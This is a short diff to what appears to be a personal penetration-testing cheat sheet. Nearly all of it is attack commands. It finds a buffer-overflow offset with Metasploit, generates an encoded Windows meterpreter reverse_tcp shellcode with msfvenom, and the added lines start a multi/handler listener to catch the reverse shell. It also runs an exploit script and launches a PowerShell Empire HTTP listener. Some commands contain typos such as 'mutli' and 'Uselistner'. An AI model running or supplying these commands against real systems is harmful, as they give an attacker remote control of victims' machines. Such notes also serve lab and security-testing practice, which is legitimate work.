@@ -55,3 +55,21 @@ cd /usr/share/etasploit-framework/tools/exploit/
 sudo ./pattern_offset.rb -q 0x386F4337 –l 2984
 
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<Kali IP> lport=<portnumber> -e x86/shikata_ga_nai -b '\x00' -f python
+
+#msfHandler
+use exploit/mutli/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost <Your kali IP>
+set lport 444
+exploit -j
+
+
+
+Python3 exploit.py
+
+sudo apt install powershell-empire
+sudo powershell-empire-server start
+sudo powershell-empire-client start
+        Uselistner http
+(Empire: uselistener/http) > set Port 80
+(Empire: uselistener/http) > execute
